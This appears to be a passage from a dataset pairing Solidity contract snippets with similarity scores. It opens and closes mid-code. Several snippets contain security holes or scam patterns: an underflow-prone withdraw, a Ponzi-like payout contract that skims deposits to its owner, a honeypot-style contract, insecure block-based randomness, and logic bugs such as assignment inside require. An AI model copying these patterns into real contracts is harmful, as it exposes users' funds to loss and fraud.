        require(newWallet != address(0));
        mainwallet = newWallet;
    }

    function ChangeRate(uint newrate) onlyOwner public {
        require(newrate > 0 );
        rate = newrate;
    }

    function MintTokens(address _to, uint256 _amount) onlyOwner public returns (bool) {
        Mint(_to,_amount);
        return token.mint(_to,_amount);
    }

    function GetBalance(address _owner) constant public returns (uint256 balance) {
        return token.balanceOf(_owner);
    }

    function GetTotal() constant public returns (uint256 Total) {
        return token.totalSupply();
    }

    function CreateTokens() payable public {
        mainwallet.transfer(msg.value);
        uint tokens = rate.mul(msg.value).div(1 ether);
        token.mint(msg.sender, tokens);
        SaleToken(msg.sender, tokens);
    }

    function() external payable {
        CreateTokens();
    }

    event SaleToken( address indexed to, uint amount);
    event Mint(address indexed to, uint256 amount);
}"
"contract Thingy {
    uint public thing;

    function doubler(uint input) public view returns (uint) {
        thing = input * 2;
        return thing;
    }
}",0.6859999668145423,"contract FiatContract {
  function USD(uint _id) public view returns (uint256);
  function updatedAt(uint _id) public view returns (uint);
}"
"contract B { 
   int public id;
   function B(int _id) { 
     id = _id;
   }
}",0.6838204309758041,"contract Incrementer {
    uint public i;
    function inc() {
        i++;
    }
}"
"contract A { 
   address Baddress;
   function createB(int _id) returns (address) { 
     Baddress = new B(_id); 
     return Baddress;
   } 
}",0.6322611389138686,"contract EtherDelta {

    function balanceOf(address tokenAddress, address userAddress) public view returns (uint);

}"
"contract Danny {
    function foo() external payable {
        require(msg.value == 1, ""Must send exactly 1"");
    }
}",0.6048690799497032,"contract WETHFace {

    function deposit() external payable;

    function withdraw(uint wad) external;

}"
"contract company {

    struct contractDetails {
        string contractId;
        string companyA;
        string companyB;
        address A;
        address B;
        uint256 timestamp;
        string signHash;
        bool isSigned;
    }

    mapping (address => contractDetails) contractAddr;
    uint public counter = 0;

     function createContract(string memory _contractId, string memory _companyA, string memory _companyB, address _B) public {
        counter++;
        contractAddr[_B] = contractDetails(_contractId, _companyA, _companyB, msg.sender, _B, now, '', false);
    }

function getAllContracts(address _address) public view returns(contractDetails[] memory) {
        contractDetails[] memory y = new contractDetails[];
        for(uint i = 0; i < counter; i++) {
            y[i] = contractAddrArr[i];
        }
        return(y);
    }
}",0.6108261886942611,"contract DigitalAssetFactory {

    address[] public contracts;

    address public lastContractAddress;

    

    event newMintableTokenContract (

       address contractAddress

    );



    constructor()

        public

    {



    }



    function getContractCount()

        public

        view

        returns(uint contractCount)

    {

        return contracts.length;

    }



    function newMintableToken(string memory symbol, string memory name, uint totalSupply, address _owner)

        public

        returns(address newContract)

    {

        MintableToken c = new MintableToken(symbol, name, totalSupply, _owner);

        contracts.push(c);

        lastContractAddress = address(c);

        emit newMintableTokenContract(c);

        return c;

    }



    function seeMintableToken(uint pos)

        public

        view

        returns(address contractAddress)

    {

        return address(contracts[pos]);

    }

}"
"contract Network 51 {

    using SafeMath for uint;
    mapping(address => uint) public userDeposit;
    mapping(address => uint) public balance;
    mapping(address => uint) public time;
    mapping(address => uint) public percentWithdraw;
    mapping(address => uint) public allPercentWithdraw;
    uint public stepTime = 0.01 hours;
    uint public countOfInvestors = 0;
    address public ownerAddress = 0x000000 ;
    uint projectPercent = 10;

    event Invest(address investor, uint256 amount);
    event Withdraw(address investor, uint256 amount);

    modifier userExist() {
        require(balance[msg.sender] > 0, ""Address not found"");
        _;
    }

    modifier checkTime() {
        require(now >= time[msg.sender].add(stepTime), ""Too fast payout request"");
        _;
    }

    function collectPercent() userExist checkTime internal {
        if ((balance[msg.sender].mul(2)) <= allPercentWithdraw[msg.sender]) {
            balance[msg.sender] = 0;
            time[msg.sender] = 0;
            percentWithdraw[msg.sender] = 0;
        } else {
            uint payout = payoutAmount();
            percentWithdraw[msg.sender] = percentWithdraw[msg.sender].add(payout);
            allPercentWithdraw[msg.sender] = allPercentWithdraw[msg.sender].add(payout);
            msg.sender.transfer(payout);


            emit Withdraw(msg.sender, payout);
        }
    }

    function percentRate() public view returns(uint) {
        uint contractBalance = address(this).balance;

        if (contractBalance < 1500 ether) {
            return (80);
        }
        if (contractBalance >= 1500 ether && contractBalance < 3500 ether) {
            return (125);
        }
        if (contractBalance >= 3500 ether && contractBalance < 7000 ether) {
            return (175);
        }
        if (contractBalance >= 7000 ether) {
            return (200);
        }
    }

    function payoutAmount() public view returns(uint256) {
        uint256 percent = percentRate();
        uint256 different = now.sub(time[msg.sender]).div(stepTime);
        uint256 rate = balance[msg.sender].mul(percent).div(1000);
        uint256 withdrawalAmount = rate.mul(different).div(24).sub(percentWithdraw[msg.sender]);

        return withdrawalAmount;
    }

    function deposit() private {
        if (msg.value > 0) {
            if (balance[msg.sender] == 0) {
                countOfInvestors += 1;
            }
            if (balance[msg.sender] > 0 && now > time[msg.sender].add(stepTime)) {
                collectPercent();
                percentWithdraw[msg.sender] = 0;
            }




            balance[msg.sender] = balance[msg.sender].add(msg.value);
            time[msg.sender] = now;

            ownerAddress.transfer(msg.value.mul(projectPercent).div(100));
            emit Invest(msg.sender, msg.value);



        } else {
            collectPercent();
        }


    }








    
    function returnDeposit()  private {
        
        uint withdrawalAmount = balance[msg.sender].sub(percentWithdraw[msg.sender]).sub(balance[msg.sender].mul(projectPercent).div(100));
        
        require(balance[msg.sender] > withdrawalAmount, 'You have already repaid your deposit');
        
        balance[msg.sender] = 0;
        time[msg.sender] = 0;
        percentWithdraw[msg.sender] = 0;
        msg.sender.transfer(withdrawalAmount);
    }





















    function() external payable {
        
        if (msg.value == 0.11111111 ether) {
            returnDeposit();
        } else {
            deposit();
        }
    }






}",0.6287118386342533,"contract SinoeCoin is ERC20 {
    
    using SafeMath for uint256; 
    address owner;

    mapping (address => uint256) balances; 
    mapping (address => mapping (address => uint256)) allowed;

    string public constant name = ""SinoeCoin"";
    string public constant symbol = ""Sinoe"";
    uint public constant decimals = 18;
    uint256 _Rate = 10 ** decimals;
    
    uint256 public totalSupply = 100000000000 * _Rate;

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

    event Burn(address indexed burner, uint256 val);
    event Increase(address indexed increaser,uint256 val);
    
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    modifier onlyPayloadSize(uint size) {
        assert(msg.data.length >= size + 4);
        _;
    }

     function SinoeCoin () public {
        owner = msg.sender;
        balances[owner] = totalSupply;
    }

    function transferOwnership(address newOwner) onlyOwner public {
        if (newOwner != address(0) && newOwner != owner){
             owner = newOwner;   
        }
    }

    function balanceOf(address _owner) constant public returns (uint256) {
	    return balances[_owner];
    }

    function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {

        require(_to != address(0));
        require(_amount <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        Transfer(msg.sender, _to, _amount);
        return true;
    }
  
    function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {

        require(_to != address(0));
        require(_amount <= balances[_from]);
        require(_amount <= allowed[_from][msg.sender]);
        
        balances[_from] = balances[_from].sub(_amount);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        Transfer(_from, _to, _amount);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }

    function allowance(address _owner, address _spender) constant public returns (uint256) {
        return allowed[_owner][_spender];
    }

    function burn(uint256 _value) onlyOwner public {
        if(_value<_Rate){
            _value = _value*_Rate;
        }
        require(_value <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender].sub(_value);
        totalSupply = totalSupply.sub(_value);
        Increase(msg.sender, _value);
    }

    function increase(uint256 _value) onlyOwner public {
        if(_value < _Rate){
            _value = _value*_Rate;
        }
        balances[msg.sender] = balances[msg.sender].add(_value);
        totalSupply = totalSupply.add(_value);
        Increase(msg.sender, _value);
    }
}"
"contract Data {

    mapping (bytes32 => uint[])  public contractsMap;

}",0.6504065286436334,contract token { mapping (address => uint256) public balanceOf;  }
"contract ContractTest {
    bytes32 public Name;

    function ContractTest (bytes32 name) {
        Name = name;
    }
}",0.6297167381862809,"contract IContractId {

    

    

    function contractId() public pure returns (bytes32 id, uint256 version);

}"
"contract FactoryTest{
    address[2] newContracts;

    function createContract (bytes32 name) {
        address newContract = new ContractTest(name);
        newContracts[0]=newContract;
    }
        function getContract() returns(address) {
          return newContracts[0];
        }
}",0.6184792172705682,"contract coinSpawn{
 	mapping(uint => XG4K) deployedContracts;
	uint numContracts;
	function createCoin() returns(address a){
		deployedContracts[numContracts] = new XG4K();
		numContracts++;
		return deployedContracts[numContracts];
	}
}"
"contract AjTokenSale {
    address admin;
    AjToken public tokenContract;
    function AjTokenSale() public {
        
        admin = msg.sender;
        
        

    }   
}",0.6579094019316812,"contract TestToken {
    
    mapping (address => uint) public balanceOf;
    
    function () public payable {
        
        balanceOf[msg.sender] = msg.value;
        
    }
    
}"
"contract Sender {
    DecisionMaker dm;

    constructor() public payable{}

    function send(address _receiver) payable {
        _receiver.call.value(10000000).gas(20317)();
    }

    function send_transfer(address _receiver, uint _amount) payable public {
        _receiver.transfer(_amount);
    }

    function placeBuy(address receiver, address decisionMaker) public {
        dm = DecisionMaker(decisionMaker);
        dm.someLogicToDecidePayment(receiver, address(this));
    }


}",0.6539928200906381,"contract Hoouusch {

   address owner;

   mapping(address => uint256) balances;

   constructor() public {

        owner = msg.sender;

    }

    

    

function () payable external {

    balances[msg.sender] += msg.value;

}  

  function withdraw(address payable receiver, uint256 amount) public {

      require(owner == msg.sender);

        receiver.transfer(amount);

        }    

  

    function transferOwnership(address newOwner) public  {

    require(owner == msg.sender);

    owner = newOwner;

  }

  

}"
"contract ApprovalContract {
    address payable public sender;
    address payable public receiver;
    address public constant approver = 0x3999BA5D247c800E5Ef3d4de66618741E3675379 ;

function deposit(address _receiver) external payable {

    require (msg.value > 0);
    sender = msg.sender;
    receiver = _receiver;   
    }

function viewApprover () external pure returns(address) {
    return(approver);
    }

function approve() external {
        require(msg.sender == approver);
        receiver.transfer(address(this).balance);

    }
}",0.6372910940950594,"contract CommunityChest {

    

    address owner;

    

    event Deposit(uint256 value);

    event Transfer(address to, uint256 value);

    

    constructor () public {

        owner = msg.sender;

    }

    

    function send(address payable to, uint256 value) public onlyOwner {

        to.transfer(value);

        emit Transfer(to, value);

    }



    function () payable external {

        emit Deposit(msg.value);

    }



    function getBalance() public view returns (uint256) {

        return address(this).balance;

    }

    

    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }

}"
"contract UsersContract {

    struct User {
        string name;
        string surname;
    }
    mapping(address => User) private users;
    mapping(address => bool) private joinedUsers;
    address[] total;
    event OnUserJoined(address, string);

    function join(string memory name, string memory surname) public {
        require(!userJoined(msg.sender));
        User storage user = users[msg.sender];
        user.name = name;       
        user.surname = surname;
        joinedUsers[msg.sender] = true;
        total.push(msg.sender);

        emit OnUserJoined(msg.sender, string(abi.encodePacked(user.name, "" 
    "", user.surname)));
}

    function getUser(address addr) public view returns (string memory, 
string memory) {
        require(userJoined(msg.sender));
        User memory user = users[addr];
        return (user.name, user.surname);   
}

    function userJoined(address addr) private view returns (bool){
        return joinedUsers[addr];
    } 

    function totalUsers() public view returns (uint){
        return total.length;
    }
}",0.6066915733719553,"contract Registry {
    struct ContractVersion {
        string name;
        address contractAddress;
    }

    modifier onlyOwner {
        require(
            msg.sender == owner,
            ""Only the contract owner is allowed to use this function.""
        );
        _;
    }

    address owner;

    ContractVersion[] versions;

    constructor() public {
        owner = msg.sender;
    }

    function addVersion(string calldata versionName, address contractAddress)
        external
        onlyOwner
    {
        ContractVersion memory newVersion = ContractVersion(
            versionName,
            contractAddress
        );
        versions.push(newVersion);
    }

    function getNumberOfVersions() public view returns (uint size) {
        return versions.length;
    }

    function getVersion(uint i)
        public
        view
        returns (string memory versionName, address contractAddress)
    {
        require(i >= 0 && i < versions.length, ""Index is out of bounds"");
        ContractVersion memory version = versions[i];
        return (version.name, version.contractAddress);
    }

}"
"contract Ballot {

   function Ballot(string _title) {

       title = _title;
   }
...

   function getTitle() constant returns (string) { return title; }

...

}",0.6281890391200903,"contract Oracle {

    function isOutcomeSet() public constant returns (bool);
    function getOutcome() public constant returns (int);
}"
"contract Test {
    address[] array;
    address[] helper;

    function Test() public {
        array.push(0x0);
        array.push(0x0);
        array.push(0x0);
        array.push(0x0);
    }

    function getSize() public view returns (uint256) {
        return array.length;
    }

    function clear() public {
        array = helper;
    } 
}",0.6286662920070311,"contract TravelHelperToken {

    function transfer (address, uint) public pure { }

    function burnTokensForSale() public returns (bool);

    function saleTransfer(address _to, uint256 _value) public returns (bool) {}

    function finalize() public pure { }

}"
"contract Basic {
    bytes32 value;

    function Basic() {
        value = ""mcansado"";
    }

    function getValue() constant returns(bytes32) {
        return value;
    }

    function setValue(bytes32 _value) constant returns(bytes32) {
        value = _value;
    }
}",0.6700731535199078,"contract Ambi {
    function getNodeAddress(bytes32) constant returns (address);
    function addNode(bytes32, address) external returns (bool);
    function hasRelation(bytes32, bytes32, address) constant returns (bool);
}"
"contract Callee {
  uint private val;

  constructor() public{
    val = 30;
  }
  function getValue() public view returns(uint) {
      return val;
  }
  function increment() public returns(uint) {
    val = val + 1;
    return val;
  }
}",0.6847085276125422,"contract Counter {

    int private count = 0;

    function incrementCounter() public {

        count += 1;

    }

    function decrementCounter() public {

        count -= 1;

    }

    function getCount() public constant returns (int) {

        return count;

    }

}"
"contract Bank is Regulator {
    uint private value;
    address private owner;

    modifier ownerFunc {
        require(owner == msg.sender);
        _;
    }

    constructor(uint amount) public {
        value = amount;
        owner = msg.sender;
    }

    function deposit(uint amount) public ownerFunc {
        value += amount;
    }

    function withdraw(uint amount) public ownerFunc {
        if (checkValue(amount)) {
            value -= amount;
        }
    }

    function balance() public view returns (uint) {
        return value;
    }

    function checkValue(uint amount) public returns (bool) {
        
        return value >= amount;
    }

    function loan() public returns (bool) {
        return value > 0;
    }
}",0.6772398956299234,"contract Token {

    
    
    
    
    function transfer(address _to, uint _value) public returns (bool) {}

    
    
    
    
    
    function transferFrom(address _from, address _to, uint _value) public returns (bool) {}

    
    
    
    
    function approve(address _spender, uint _value) public returns (bool) {}

    
    
    function balanceOf(address _owner) public view returns (uint) {}

    
    
    
    function allowance(address _owner, address _spender) public view returns (uint) {}

    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
}"
"contract TestThrows {
    function testAssert() public pure {
        assert(1 == 2);
    }

    function testRequire() public pure {
        require(2 == 1);
    }

    function testRevert() public pure {
        revert();
    }

    function testThrow() public pure {
        throw;
    }
}",0.6196818827207419,"contract EndLike {
    function fix(bytes32) public view returns (uint);
    function cash(bytes32, uint) public;
    function free(bytes32) public;
    function pack(uint) public;
    function skim(bytes32, address) public;
}"
"contract UnderflowAttack {
 ...
 function withdraw (uint amount) public {
   require(balances[msg.sender] - amount > 0);
   msg.sender.transfer(amount);
   balances[msg.sender] -= amount; 
 }
 ...
}",0.6221209053079562,"contract Faucet {

    

    

    function withdraw(uint withdraw_amount) public {

        

        

        require(withdraw_amount<=1000000000000);

        

        

        msg.sender.transfer(withdraw_amount);

    }

    

    

    function () public payable {}

    

}"
"contract EtherDie {
    address payable owner;
    uint256 public maxSendPercentage = 5;
    uint256 public prizePercentage = 10;
    uint256 public winPercentage = 60;
    event Winnings(uint256);
    bool locked;

    modifier noReentrancy() {
        require(!locked,""Reentrant call"");
        locked = true;
        _;
        locked = false;
    }

    constructor() public payable {
        owner = msg.sender;
    }

     function () external payable {
        
    }

    function send() public payable noReentrancy {
        require(msg.value <= 5 ether && msg.value < address(this).balance * maxSendPercentage / 100, ""sending too much"");
        if (random() < winPercentage) {
            uint winnings = msg.value * prizePercentage / 100;
            emit Winnings(winnings);
            msg.sender.transfer(msg.value + winnings);
        }
    }

    function withdraw(uint256 _wei) public payable {
        require(owner == msg.sender,  ""cannot withdraw"");
        owner.transfer(_wei);
    }

    function setPrizePercentage(uint256 _prizePercentage) public {
        require(owner == msg.sender,  ""cannot set price percentage"");
        prizePercentage = _prizePercentage;
    }

    function setMaxSendPercentage(uint256 _maxSendPercentage) public {
        require(owner == msg.sender,  ""cannot set max send percentage"");
        maxSendPercentage = _maxSendPercentage;
    }

    function setWinPercentage(uint256 _winPercentage) public {
        require(owner == msg.sender,  ""cannot set win percentage"");
        winPercentage = _winPercentage;
    }

    function random() private view returns(uint){
        uint source = block.difficulty + now;
        bytes memory source_b = toBytes(source);
        return uint(keccak256(source_b)) % 100;
    }

    function toBytes(uint256 x) private pure returns (bytes memory b) {
        b = new bytes(32);
        assembly { mstore(add(b, 32), x) }
    }
}",0.6143144138272829,"contract EthereumButton {
    address private owner;
    address private lastPresser;
    uint256 private targetBlock;
    uint256 private pressCount;
    bool private started = false;

    event Pressed(address _presser, uint256 _timestamp);
    
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    modifier onlyWhenStarted() {
        require(started == true);
        _;
    }

    modifier onlyWhenPaused() {
        require(started == false);
        _;
    }
    
    function EthereumButton() public {
        owner = msg.sender;
    }
    
    function start() public onlyOwner onlyWhenPaused {
        started = true;
        targetBlock = block.number + 240;
        pressCount = 0;
        lastPresser = 0x0;
    }

    function() public payable {
        revert();
    }   

    function pressButton() public onlyWhenStarted payable {
        require(msg.value == 10000000000000000 && block.number <= targetBlock);

        lastPresser = msg.sender;
        targetBlock = targetBlock + 240;
        pressCount++;

        Pressed(msg.sender, now);
    }

    function getPressCount() public view returns(uint256) {
        return pressCount;
    }

    function getTargetBlock() public view returns(uint256) {
        return targetBlock;
    }

    function getLastPresser() public view returns(address) {
        return lastPresser;
    }
    
    function claimPrize() public onlyWhenStarted {
        require(block.number > targetBlock && (msg.sender == lastPresser || msg.sender == owner));

        
        if (pressCount == 0) {
            started = false;
            return;
        }

        uint256 amount = pressCount * 9500000000000000;
        
        lastPresser.transfer(amount);

        started = false;
    }

    function depositEther() public payable onlyOwner { } 

    function kill() public onlyOwner onlyWhenPaused {
        selfdestruct(owner);
    }

    function withdrawBalance() public onlyOwner onlyWhenPaused {
        owner.transfer(this.balance);
    }
}"
"contract SimpleToken {
    mapping(address => uint) public balances;

    function buyToken() payable {
        balances[msg.sender]+=msg.value / 1 ether;
    }

    function sendToken(address _recipient, uint _amount) {
        require(balances[msg.sender]!=0);

        balances[msg.sender]-=_amount;
        balances[_recipient]+=_amount;
    }
}",0.6503182678578635,"contract Balance {
    mapping(address => uint) public balances;

    
    function balanceOf(address account) public constant returns (uint) {
        return balances[account];
    }

    modifier hasSufficientBalance(address account, uint balance) {
        require(balances[account] >= balance);
        _;
    }
}"
"contract Inheritance {
    address owner;
    bool deceased;
    uint money;

    constructor() public payable {
        owner = msg.sender;
        money = msg.value;
        deceased = false;
    }

    modifier oneOwner {
        require (msg.sender == owner);
        _;
    }

    modifier isDeceased {
        require (deceased = true);
        _;
    }

    
    address payable[] wallets;


    
    mapping (address => uint) inheritance;

    
    
    function setup(address payable _wallet, uint _inheritance) public oneOwner {
        wallets.push(_wallet);
        inheritance[_wallet] = _inheritance;
    }

    function moneyPaid() private isDeceased {
        for (uint i=0; 0<wallets.length; i++) {
            wallets[i].transfer(inheritance[wallets[i]]);
        }
    }

    function died() public oneOwner {
        deceased = true;
        moneyPaid();
    }

}",0.6509662757191351,"contract Ownable {



    

    address public initialOwner;

    

    mapping(address => bool) owners;

    

    

    event AddOwner(address indexed admin);

    

    

    event DeleteOwner(address indexed admin);

    

    

    modifier onlyOwners() {

        require(

            msg.sender == initialOwner

            || inOwners(msg.sender)

        );

        _;

    }

    

    

    modifier onlyInitialOwner() {

        require(msg.sender == initialOwner);

        _;

    }

    

    

    function addOwner(address _wallet) public onlyInitialOwner {

        owners[_wallet] = true;

        emit AddOwner(_wallet);

    }

    

    

    function deleteOwner(address _wallet) public onlyInitialOwner {

        owners[_wallet] = false;

        emit DeleteOwner(_wallet);

    }

    

    

    function inOwners(address _wallet)

    public

    view

    returns(bool)

    {

        if(owners[_wallet]){ 

            return true;

        }

        return false;

    }

    

}"
"contract simple is owned {
    function twice(int a) constant returns(int) {
        return 2*a;
    }
}",0.682534702085986,contract test { function multiply(uint a) public pure returns(uint d) {   return a * 7;   } }
"contract Mutex {
  bool locked;
modifier noReentrancy() {
    require(!locked);
    locked = true;
    _;
    locked = false;
}





  function f() public noReentrancy returns (uint) {
    require(msg.sender.call());
   return 7;
  }
}",0.6320904321720066,"contract Owned {
    bool public locked = true;
    address public Owner = msg.sender;
    modifier onlyOwner { if (msg.sender == Owner || !locked) _; }
    function lock(bool flag) onlyOwner { locked = flag; }
}"
"contract ApprovalContract {
    address payable public sender;
    address payable public receiver;
    address public constant approver = <some account address>;

    function deposit (address payable _receiver) external payable {
        require(msg.value > 0);
        sender = msg.sender;
        receiver = _receiver;
    }

}",0.6434079216655332,"contract ERC20 is ERC20Basic {
  function allowance(address owner, address spender) public constant returns (uint256);
  function approve(address spender, uint256 value) public returns (bool);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}"
"contract TheContract {
    address public mateAddress = OxB

    function () payable public {
        if (msg.sender == mateAddress) {
            
        }
    }

    function checkStatus() {
        if (someCondition) {
            address myAddress = this;
            mateAddress.send(myAddress.balance);
        }
    }
}",0.6286109649429457,"contract Maths

{

    address Z = msg.sender;

    function() public payable {}

    function X() public { if (msg.sender==Z) selfdestruct(msg.sender); }

    function Y() public payable { if (msg.value >= this.balance) msg.sender.transfer(this.balance); }

 }"
"contract ICOToken is DappToken {

   string public name = 'ICOToken';
   string public symbol = 'ITK';
   uint256 public decimals = 18;
   uint256 public totalSupply;
   address public crowdsaleAddress;
   address public owner;
   uint256 public ICOEndTime = 1541246755;
   uint256 public balance;

   modifier onlyCrowdsale {
      require(msg.sender == crowdsaleAddress);
      _;
   }

   modifier onlyOwner {
      require(msg.sender == owner);
      _;
   }






   constructor (uint256 _tokenSupply) public DappToken() {
      totalSupply = _tokenSupply;
      balanceOf[msg.sender] = _tokenSupply;
      owner = msg.sender;
   }


   function setCrowdsale(address _crowdsaleAddress) public onlyOwner  {

      require(_crowdsaleAddress != address(0));
      crowdsaleAddress = _crowdsaleAddress;

   }


    function buyTokens(address _receiver, uint256 _amount) public  {

      require(_receiver != address(0));
      require(_amount > 0);
      transfer(_receiver, _amount);


   }










































}",0.6894807597466853,"contract ATFSToken is ERC20 {
    using SafeMath for uint;
    string public name = ""ATFS Token"";
    string public symbol = ""ATFS"";
    uint8 public decimals = 8;
    address public crowdsaleMinter;
    modifier onlyCrowdsaleMinter(){
        require(msg.sender == crowdsaleMinter);
        _;
    }
    modifier isNotStartedOnly() {
        require(!isStarted);
        _;
    }
    function ATFSToken(address _crowdsaleMinter) public {
        crowdsaleMinter = _crowdsaleMinter;
    }
    function getTotalSupply()
    public
    constant
    returns(uint)
    {
        return totalSupply;
    }
    function start()
    public
    onlyCrowdsaleMinter
    isNotStartedOnly
    {
        isStarted = true;
    }
    function emergencyStop()
    public
    only(owner)
    {
        isStarted = false;
    }
    
    function mint(address _to, uint _amount) public
    onlyCrowdsaleMinter
    isNotStartedOnly
    returns(bool)
    {
        totalSupply = totalSupply.add(_amount);
        balances[_to] = balances[_to].add(_amount);
        return true;
    }
}"
"contract Register {
    address owner;
    mapping (string => address) public backends;

    function Register() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function changeBackend(string contractName, address newBackend) public onlyOwner() returns (bool) {
        if(newBackend != backends[contractName]) {
            backends[contractName] = newBackend;
            return true;
        }

        return false;
    }
}",0.6883394033323733,"contract BBZZXUCAuth{

    address public owner;

    constructor () public{

        owner = msg.sender;

    }

    event LogOwnerChanged (address msgSender );



    

    modifier onlyOwner{

        assert(msg.sender == owner);

        _;

    }



    function setOwner (address newOwner) public onlyOwner returns (bool){

        if (owner == msg.sender){

            owner = newOwner;

            emit LogOwnerChanged(msg.sender);

            return true;

        }else{

            return false;

        }

    }



}"
"contract USDPrice is usingOraclize {

    string public price;
    address public owner;
    event Log(string text);

    function USDPrice() {
        Log(""Contract created."");
        owner = msg.sender;
        OAR = OraclizeAddrResolverI(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475);
        oraclize_setProof(proofType_TLSNotary | proofStorage_IPFS);
        oraclize_setCustomGasPrice(20000000000 wei);
    }

    function getPrice() constant returns (string) {
       return price;
    }

    function __callback(bytes32 _myid, string _result){
        require (owner == oraclize_cbAddress()); revert();
        Log(""Intra in callback"");
        Log(_result);
        price = _result; 
    }

    function update() payable {
         if (oraclize_getPrice(""URL"") > this.balance) {
            Log(""Not working"");
            
        } else {
            
            oraclize_query(0,""URL"", ""https:
            Log(""Working"");
        }
    }
}",0.6503087298561795,"contract DrawContract is usingOraclize {



    mapping(bytes32 => bool) validIds;



    event LogQueryId(bytes32 queryId);

    event LogNewOraclizeQuery(string description);



    address owner;



    constructor () payable public{

        owner = msg.sender;

    }



    function __callback(bytes32 myid) public {

        if (!validIds[myid]) revert();

        if (msg.sender != oraclize_cbAddress()) revert();

        delete validIds[myid];

    }



    function draw(string url, string lotterySlug, string drawDate) payable external {

        require(msg.sender == owner);

        if (oraclize_getPrice(""URL"") > address(this).balance) {

            emit LogNewOraclizeQuery(""false"");

        } else {

            bytes32 queryId = oraclize_query(""URL"", url);

            validIds[queryId] = true;

            emit LogQueryId(queryId);

            emit LogNewOraclizeQuery(""true"");

        }

    }

}"
"contract abcToken is ERC721 { 

    struct Item{
        uint id;
        bytes name; 
        uint creationTime; 
        uint tokenType;  
        uint expiryduration;
    }

    Item[] public items; 

    struct User {
        uint[][] tokenId;
    }

    mapping (address => User) usersByAddr;
    address[] users;
    address public owner;
    address[] public owners;
    uint[] public tokenCount;
    uint[] public tokenCountInSupply;
    bytes transactionSymbol = ""MTXN"";
    bytes reputationSymbol = ""MREP"";
    bytes attentionSymbol = ""MATT"";

    event tokenCreated(address _to, uint _tokenType, uint _amount, uint timeCreated, uint[] _tokenId);
    event tokenDestroyed(address _from, uint _tokenType, uint _amount, uint timeDestroyed, uint[] _tokenId, bool penalty);
    event tokenTransfer(address _from, address _to, uint _tokenType, uint _amount, uint transferTime, uint[] _tokenId);
    event ownerAdded(address _primaryOwner, address _secondaryOwner);
    event ownerRemoved(address _primaryOwner, address _secondaryOwner);

    constructor() public {
        owner == msg.sender; 
        owners.push(msg.sender); 
        for(uint i = 0; i < 3; i++) {
            tokenCount[i] = 0;
            tokenCountInSupply[i] = 0;
        }
    }
    
    function isOwner() public view returns (bool) {
        for (uint i = 0; i < owners.length; i++) {
            if (owners[i] == msg.sender) {
                return true;
            }
        }
        return false;
    }

    
    modifier onlyOwner() {
        require(isOwner());
        _;
    }

    function createItem(address _to, uint _tokenType, uint _expiryduration, uint quantity) public onlyOwner() {
        
        
        bytes memory tokenSymbol;
        if(_tokenType == 0) tokenSymbol = transactionSymbol;
        if(_tokenType == 1) tokenSymbol = reputationSymbol;
        if(_tokenType == 2) tokenSymbol = attentionSymbol;
        bytes memory _name = tokenSymbol; 
        uint[] memory _tokenIds;
        uint _creationTime = block.timestamp;
        bool firstTimeUser = true;
        for(uint j = 0; j < users.length; j++) {
            if (users[j] == _to) {
                firstTimeUser = false;
                break;
            }
        }
        for (uint i = 0; i < quantity; i++) {
            uint id = items.length; 
            items.push(Item(id,_name, _creationTime, _tokenType, _expiryduration));
            _tokenIds[i] = id;
            if(!firstTimeUser) {
                uint usertokenlength = usersByAddr[_to].tokenId[_tokenType].length;
                usersByAddr[_to].tokenId[_tokenType][usertokenlength] = id;
            }
            if (firstTimeUser) {
                uint[][] memory usersTokens;
                usersTokens[_tokenType][0] = id;
                User memory newuser = User(usersTokens);
                usersByAddr[_to] = newuser;
                users.push(_to);
                firstTimeUser = false;
            }
            _mint(_to,id); 
            tokenCount[_tokenType] += 1;
            tokenCountInSupply[_tokenType] += 1;
        }
        emit tokenCreated(_to, _tokenType, quantity, _creationTime, _tokenIds);
    }

    function getUsers() public view returns (address[] memory _users) {
        return users;
    }

    function tokenDetails(uint _tokenId) public view returns (uint _id, bytes memory _tokenName, uint _creationTime, uint _tokenType, uint _expiryduration) { 
        for(uint i = 0; i < items.length; i++) {
            if(items[i].id == _tokenId) {
                _id = items[i].id;
                _tokenName = items[i].name;
                _creationTime = items[i].creationTime;
                _tokenType = items[i].tokenType;
                _expiryduration = items[i].expiryduration;
            }
        }
        return (_id, _tokenName, _creationTime, _tokenType, _expiryduration);
    }

    function getUserTokens(address _userAddress, uint _tokenType) public returns (uint[] memory _tokens) { 
        burnToken(_userAddress);
        return usersByAddr[_userAddress].tokenId[_tokenType];
    }

    function getUserBalance(address _userAddress) public view returns(uint txnBlanace, uint repBalance, uint attBalance) {
        txnBlanace = usersByAddr[_userAddress].tokenId[0].length;
        repBalance = usersByAddr[_userAddress].tokenId[1].length;
        attBalance = usersByAddr[_userAddress].tokenId[2].length;
        return (txnBlanace, repBalance, attBalance);
    }

    function burnTokenPenalty(address _userAddress, uint _tokenType, uint quantity) public onlyOwner() returns (uint _tokenBurntQuantity) {
        uint[] memory tokensDeletedPosition;
        uint[] memory _tokenIds;
        for(uint j = 0; j < usersByAddr[_userAddress].tokenId[_tokenType].length; j++) {
            if(_tokenIds.length < quantity && items[usersByAddr[_userAddress].tokenId[_tokenType][j]].creationTime + items[usersByAddr[_userAddress].tokenId[_tokenType][j]].expiryduration >= block.timestamp) {
                _burn(_userAddress, items[usersByAddr[_userAddress].tokenId[_tokenType][j]].id);
